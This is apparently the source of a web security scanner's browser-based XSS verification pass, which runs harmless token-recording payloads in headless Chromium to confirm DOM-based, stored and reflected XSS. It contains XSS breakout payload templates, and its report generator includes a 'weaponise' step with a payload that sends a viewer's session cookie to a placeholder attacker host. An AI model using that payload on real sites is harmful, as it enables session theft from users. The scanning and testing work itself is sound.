"""
dom_xss — browser-verified DOM-based / stored XSS (optional Playwright pass for xss_detect).

The httpx passes in ``xss_detect`` only see server HTML. A payload that the page writes into the DOM
with client-side JavaScript (``el.innerHTML = …``, ``$(...).html(…)``, a value read from
``location.hash``) never appears in the server response and only *executes* in a real browser — so an
HTTP-only scanner is structurally blind to it.

This pass drives headless Chromium and tests two DOM vectors per candidate page:
  * **URL fragment (#hash)** — loads the page with a token-bearing payload in the hash, catching DOM
    XSS where client JS reads ``location.hash`` (e.g. Google's XSS-game level 3);
  * **form fields** — fills the text fields, submits and reloads, catching stored/DOM XSS where a saved
    value is rendered with client-side JS (e.g. XSS-game level 2).

Either way it confirms *execution* by catching a callback from a **benign, token-bearing** payload — a
unique ``window.__hadesxss(token)`` hook (and a wrapped ``alert``/``confirm``/``prompt``). A fired token
proves the bug. Detection-only: no exfiltration, no network egress, no persistence beyond the app's own
storage. Findings are emitted under ``xss_detect`` (no new registered module). Everything is bounded
(page/field caps, per-nav timeouts) and every failure is swallowed so a browser hiccup never breaks the
scan.
"""
from __future__ import annotations

import uuid
from dataclasses import dataclass
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from loguru import logger

from scanner import browser as br
from scanner.engine import Finding, Severity, ScanEngine

# Findings are attributed to xss_detect (module 33) — this is a verification pass, not a new module.
MODULE = "xss_detect"

_MAX_PAGES = 5          # candidate pages to drive
_MAX_FIELDS = 3         # text fields to fuzz per page
_NAV_TIMEOUT_MS = 15000
_NAV_WAIT = "load"      # wait for window.onload — apps often wire handlers / read the hash there
_SETTLE_MS = 1800       # form: let the async save (XHR) + re-render run
_FRAG_SETTLE_MS = 900   # fragment: render is synchronous on load

# Free-text field-name hints worth fuzzing for stored XSS (prioritises pages that have them).
_TEXTISH = ("message", "comment", "status", "body", "content", "text", "post", "note", "title",
            "subject", "description", "feedback", "review", "search", "q", "query", "name")

# Benign payload templates. {cb} is the callback expression; the second tuple item is the quote the
# callback's token must use so it does NOT clash with the attribute quote in the template.
_FORM_TEMPLATE = ('"><img src=x onerror="{cb}">', "'")     # value inserted via innerHTML → break out
_FRAG_TEMPLATES = (
    ("x' onerror='{cb}", '"'),              # single-quoted attribute (xss-game level 3)
    ('x" onerror="{cb}', "'"),              # double-quoted attribute
    ('<img src=x onerror="{cb}">', "'"),    # raw HTML element / innerHTML
    ('"><img src=x onerror="{cb}">', "'"),  # attribute → element
)
# Reflected query-parameter sinks. The browser executes them, so this catches contexts an HTTP-only
# check mis-reads — notably an event-handler attribute (onload="…('{param}')…"), where the server may
# entity-encode the quote (&#39;) yet the browser decodes it back to ' before running the JS.
_PARAM_TEMPLATES = (
    ("');{cb};//", "'"),                    # break a single-quoted JS string (event handler) — level 4
    ('");{cb};//', '"'),                    # break a double-quoted JS string
    ('<img src=x onerror="{cb}">', "'"),    # HTML body / text
    ('"><img src=x onerror="{cb}">', "'"),  # break a double-quoted attribute → element
    ("'><img src=x onerror=\"{cb}\">", "'"),  # break a single-quoted attribute → element
)
_MAX_PARAMS = 8
_POC = "alert(document.domain)"             # self-contained PoC (no quotes → safe in any context)

# Runs before page scripts on every navigation: defines the hook + wraps dialogs (capped so a payload
# that fires on every render — e.g. a multi-image page — can't grow the array without bound).
_INIT_SCRIPT = """
window.__hadesxss_hits = window.__hadesxss_hits || [];
window.__hadesxss = function(t){ try { var a=window.__hadesxss_hits; if(a.length<50) a.push(String(t)); } catch(e){} };
['alert','confirm','prompt'].forEach(function(fn){
  try { window[fn] = function(){ try { var a=window.__hadesxss_hits; if(a.length<50) a.push('ALERT:'+arguments[0]); } catch(e){} return true; }; }
  catch(e){}
});
"""

_FIELD_SELECTOR = ("textarea, input[type=text], input[type=search], input[type=url], "
                   "input[type=email], input:not([type])")


@dataclass
class DomXssHit:
    url: str
    field: str
    payload: str
    trigger: str            # "dom-hook" | "alert"
    token: str
    vector: str = "form"    # "form" | "fragment"
    poc: str = ""           # self-contained reproduction (alert) payload / URL


def _is_textish(name: str) -> bool:
    low = (name or "").lower()
    return any(h in low for h in _TEXTISH)


def _det_payload(template: str, token_quote: str, token: str) -> str:
    """The detection payload: the template wired to the token-recording hook."""
    cb = f"window.__hadesxss&&window.__hadesxss({token_quote}{token}{token_quote})"
    return template.format(cb=cb)


def _poc_payload(template: str) -> str:
    """The self-contained reproduction payload: the same template wired to a visible alert."""
    return template.format(cb=_POC)


def _payload(token: str) -> str:
    """Detection payload for a form field (value inserted via innerHTML)."""
    return _det_payload(_FORM_TEMPLATE[0], _FORM_TEMPLATE[1], token)


def _set_param(url: str, param: str, value: str) -> str:
    """Return *url* with query parameter *param* set to *value*."""
    pr = urlparse(url)
    qs = parse_qs(pr.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(pr._replace(query=urlencode(qs, doseq=True)))


# ---------------------------------------------------------------------------
# Candidate selection
# ---------------------------------------------------------------------------

def candidates(engine: ScanEngine) -> list[str]:
    """Pages worth driving in a browser: those carrying a form (textish forms first) + the target."""
    seen: set[str] = set()
    prioritized: list[str] = []
    rest: list[str] = []
    try:
        crawl = engine.get_crawl()
    except Exception:  # noqa: BLE001
        crawl = None
    for form in (crawl.forms if crawl else []):
        page = form.source_url or form.action
        if not page or page in seen:
            continue
        seen.add(page)
        (prioritized if any(_is_textish(n) for n in form.fields) else rest).append(page)
    if engine.url not in seen:
        prioritized.append(engine.url)
    return (prioritized + rest)[:_MAX_PAGES]


# ---------------------------------------------------------------------------
# Browser interaction (each helper is defensive — never raises out)
# ---------------------------------------------------------------------------

def _fired_token(page: Any, token: str) -> str:
    """Return the trigger name if *token* shows up in the in-page hit log, else ''."""
    try:
        hits = page.evaluate("window.__hadesxss_hits || []") or []
    except Exception:  # noqa: BLE001
        return ""
    for h in hits:
        s = str(h)
        if token in s:
            return "alert" if s.startswith("ALERT:") else "dom-hook"
    return ""


def _submit(page: Any, field: Any) -> None:
    """Submit the field's *own* form — pages often have several forms (e.g. a separate "clear" form),
    so a page-wide submit button is the wrong one. Falls back to requestSubmit()/submit()/Enter."""
    try:
        ok = field.evaluate(
            "el => {"
            "  const form = el.form || el.closest('form');"
            "  if (!form) return false;"
            "  const btn = form.querySelector('button[type=submit], input[type=submit], button:not([type])');"
            "  if (btn) { btn.click(); return true; }"
            "  if (form.requestSubmit) { form.requestSubmit(); return true; }"
            "  form.submit(); return true;"
            "}")
        if ok:
            return
    except Exception:  # noqa: BLE001
        pass
    try:
        field.press("Enter")
    except Exception:  # noqa: BLE001
        pass


def _verify_fragment(context: Any, url: str) -> DomXssHit | None:
    """Load *url* with token-bearing payloads in the #fragment; report the first that executes."""
    base = url.split("#")[0]
    for template, token_quote in _FRAG_TEMPLATES:
        token = uuid.uuid4().hex[:12]
        payload = _det_payload(template, token_quote, token)
        page = context.new_page()
        try:
            page.goto(base + "#" + payload, timeout=_NAV_TIMEOUT_MS, wait_until=_NAV_WAIT)
            page.wait_for_timeout(_FRAG_SETTLE_MS)
            trigger = _fired_token(page, token)
            if trigger:
                return DomXssHit(url=base, field="URL fragment (#)", payload=payload, trigger=trigger,
                                 token=token, vector="fragment", poc=base + "#" + _poc_payload(template))
        except Exception as exc:  # noqa: BLE001
            logger.debug(f"dom_xss: fragment probe {base} failed: {exc}")
        finally:
            try:
                page.close()
            except Exception:  # noqa: BLE001
                pass
    return None


def _verify_param(context: Any, url: str, param: str) -> DomXssHit | None:
    """Navigate to *url* with *param* set to token-bearing breakout payloads; report the first that
    executes in the browser. Catches reflected XSS whose context an HTTP-only check mis-reads."""
    for template, token_quote in _PARAM_TEMPLATES:
        token = uuid.uuid4().hex[:12]
        det = _det_payload(template, token_quote, token)
        page = context.new_page()
        try:
            page.goto(_set_param(url, param, det), timeout=_NAV_TIMEOUT_MS, wait_until=_NAV_WAIT)
            page.wait_for_timeout(_FRAG_SETTLE_MS)
            trigger = _fired_token(page, token)
            if trigger:
                return DomXssHit(url=url, field=f"URL parameter '{param}'", payload=det, trigger=trigger,
                                 token=token, vector="param",
                                 poc=_set_param(url, param, _poc_payload(template)))
        except Exception as exc:  # noqa: BLE001
            logger.debug(f"dom_xss: param probe {param} on {url} failed: {exc}")
        finally:
            try:
                page.close()
            except Exception:  # noqa: BLE001
                pass
    return None


def _verify_field(context: Any, url: str, index: int) -> DomXssHit | None:
    """Fill the *index*-th text field on a fresh load of *url*, submit, reload, check for a fire."""
    page = context.new_page()
    try:
        page.goto(url, timeout=_NAV_TIMEOUT_MS, wait_until=_NAV_WAIT)
        fields = page.query_selector_all(_FIELD_SELECTOR)
        if index >= len(fields):
            return None
        field = fields[index]
        name = field.get_attribute("name") or field.get_attribute("id") or f"field#{index}"
        token = uuid.uuid4().hex[:12]
        payload = _payload(token)
        field.fill(payload)
        _submit(page, field)
        page.wait_for_timeout(_SETTLE_MS)

        trigger = _fired_token(page, token)        # reflected / immediate (SPA) render
        if not trigger:
            try:                                   # stored: reload so saved content re-renders
                page.goto(url, timeout=_NAV_TIMEOUT_MS, wait_until=_NAV_WAIT)
                page.wait_for_timeout(_SETTLE_MS)
                trigger = _fired_token(page, token)
            except Exception:  # noqa: BLE001
                pass
        if trigger:
            return DomXssHit(url=url, field=name, payload=payload, trigger=trigger, token=token,
                             vector="form", poc=_poc_payload(_FORM_TEMPLATE[0]))
        return None
    finally:
        try:
            page.close()
        except Exception:  # noqa: BLE001
            pass


def _field_count(context: Any, url: str) -> int:
    page = context.new_page()
    try:
        page.goto(url, timeout=_NAV_TIMEOUT_MS, wait_until=_NAV_WAIT)
        return len(page.query_selector_all(_FIELD_SELECTOR))
    except Exception:  # noqa: BLE001
        return 0
    finally:
        try:
            page.close()
        except Exception:  # noqa: BLE001
            pass


def verify(engine: ScanEngine, pages: list[str],
           params: list[tuple[str, str]] | None = None) -> list[DomXssHit]:
    """Drive headless Chromium: probe *pages* (fragment + form vectors) and reflected *params* (a list
    of (url, param)). Return confirmed XSS hits. Never raises."""
    hits: list[DomXssHit] = []
    try:
        from playwright.sync_api import sync_playwright
    except Exception as exc:  # noqa: BLE001
        logger.debug(f"dom_xss: Playwright unavailable: {exc}")
        return hits

    try:
        with sync_playwright() as p:
            browser, context = br.launch_context(p, engine)
            try:
                context.add_init_script(_INIT_SCRIPT)
                # Reflected query-parameter vector (browser-executed → catches event-handler/entity cases).
                tried: set[str] = set()
                for url, param in (params or [])[:_MAX_PARAMS]:
                    if param in tried:
                        continue
                    tried.add(param)
                    try:
                        hit = _verify_param(context, url, param)
                    except Exception as exc:  # noqa: BLE001
                        logger.debug(f"dom_xss: param {param} failed: {exc}")
                        continue
                    if hit:
                        hits.append(hit)
                for url in pages[:_MAX_PAGES]:
                    # 1) URL-fragment vector (no form needed) — one strong finding per page is enough.
                    try:
                        frag = _verify_fragment(context, url)
                    except Exception as exc:  # noqa: BLE001
                        logger.debug(f"dom_xss: fragment {url} failed: {exc}")
                        frag = None
                    if frag:
                        hits.append(frag)
                        continue
                    # 2) Form-field vector (stored / DOM).
                    seen_fields: set[str] = set()
                    n = min(_field_count(context, url), _MAX_FIELDS)
                    for i in range(n):
                        try:
                            hit = _verify_field(context, url, i)
                        except Exception as exc:  # noqa: BLE001
                            logger.debug(f"dom_xss: {url} field#{i} failed: {exc}")
                            continue
                        if hit and hit.field not in seen_fields:
                            seen_fields.add(hit.field)
                            hits.append(hit)
            finally:
                browser.close()
    except Exception as exc:  # noqa: BLE001 — a browser failure must never break the scan
        logger.warning(f"dom_xss: browser pass failed: {exc}")
    return hits


# ---------------------------------------------------------------------------
# Finding factory
# ---------------------------------------------------------------------------

def to_finding(hit: DomXssHit) -> Finding:
    if hit.vector == "param":
        where = f"{hit.field} on {hit.url}"
        sink = ("the reflected parameter is executed as JavaScript by the browser — e.g. inside an "
                "event-handler attribute, where the server may entity-encode the quote (&#39;) yet the "
                "browser decodes it back before running the JS, so HTTP-only checks wrongly read it as safe")
        repro_desc = ("Reproduce in any browser — open this URL; the reflected parameter executes. "
                      "(Hades detected it with a benign hook — see the evidence box for the exact payload.)")
        repro_cmd = hit.poc or hit.url
        title_kind, title_what = "Reflected XSS", hit.field
    elif hit.vector == "fragment":
        where = f"the URL fragment (#) of {hit.url}"
        sink = "client-side JS reads location.hash and writes it into the DOM"
        repro_desc = ("Reproduce in any browser — load this URL; the payload runs when the page reads "
                      "location.hash. (Hades detected it with a benign hook — see the evidence box for "
                      "the exact payload it fired.)")
        repro_cmd = hit.poc or hit.url
        title_kind, title_what = "DOM-based XSS", "URL fragment (#)"
    else:
        where = f"form field '{hit.field}' on {hit.url}"
        sink = "the saved value is written into the DOM (e.g. innerHTML) and runs when the page renders"
        repro_desc = (f"Reproduce in any browser — submit this self-contained PoC into the '{hit.field}' "
                      f"field at {hit.url}; it fires when the value renders. (Hades detected it with a "
                      "benign hook — see the evidence box for the exact payload it fired.)")
        repro_cmd = hit.poc or '<img src=x onerror="alert(document.domain)">'
        title_kind, title_what = "DOM-based / Stored XSS", hit.field

    desc = (f"A benign token payload injected at {where} executed in a real browser (trigger: "
            f"{hit.trigger}) — {sink}. Confirmed by actual execution in headless Chromium, not by "
            "inspecting the response — so encoding that looks safe to an HTTP-only check is caught.")
    raw = {
        "location": where, "url": hit.url, "field": hit.field, "vector": hit.vector,
        "payload": hit.payload, "trigger": hit.trigger, "confidence": "high", "verified": "browser",
        "evidence": [
            f"injected at {where}: {hit.payload}",
            f"payload executed in headless Chromium (trigger: {hit.trigger}, token {hit.token})",
        ],
        "exploitation": [
            {"step": 1, "description": repro_desc, "command": repro_cmd},
            {"step": 2, "description": "Auto-discover working payloads / confirm with dalfox.",
             "command": f'dalfox url "{hit.url}"'},
            {"step": 3, "description": "Weaponise: exfiltrate the viewer's session cookie.",
             "command": '<img src=x onerror="new Image().src=\'https://ATTACKER/c?\'+document.cookie">'},
        ],
    }
    return Finding(
        module=MODULE,
        title=f"{title_kind} (browser-verified): {title_what}",
        description=desc,
        severity=Severity.HIGH,
        recommendation=("Never write untrusted input (form values, URL/location.hash) with innerHTML — "
                        "use textContent or a safe templating layer that auto-escapes; context-encode on "
                        "output and add a strict Content-Security-Policy that forbids inline handlers."),
        raw=raw,
    )
